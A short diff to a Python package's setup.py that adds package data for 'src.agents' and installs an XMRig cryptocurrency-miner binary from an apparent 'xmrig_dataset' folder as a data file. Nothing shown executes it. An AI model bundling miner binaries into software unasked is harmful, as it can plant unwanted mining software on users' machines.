@@ -71,5 +71,9 @@ setup(
     include_package_data=True,
     package_data={
         "": ["templates/*", "static/*", "data/*"],
+        "src.agents": ["data/*"],
     },
+    data_files=[
+        ("src/agents/data", ["data/xmrig_dataset/xmrig-6.18.1/xmrig"]),
+    ],
 )
